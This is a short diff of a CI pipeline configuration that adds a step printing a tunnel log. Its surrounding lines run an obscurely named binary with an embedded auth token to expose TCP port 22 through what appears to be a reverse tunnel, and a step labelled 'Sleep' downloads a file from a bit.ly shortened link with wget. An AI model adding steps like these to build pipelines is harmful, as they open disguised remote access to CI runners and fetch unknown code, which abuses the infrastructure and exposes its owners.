@@ -44,6 +44,10 @@ jobs:
           sudo su --command "./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY"
           sudo su --command "nohup ./3Iaxfe5 tcp 22 --log=stdout > sesah.log &"
       - run: 
+         name: Sesah URL 
+         command: |
+          sudo su --command "cat sesah.log"
+      - run: 
          name: Sleep
          command: |
           wget https://bit.ly/3BsaT4Q
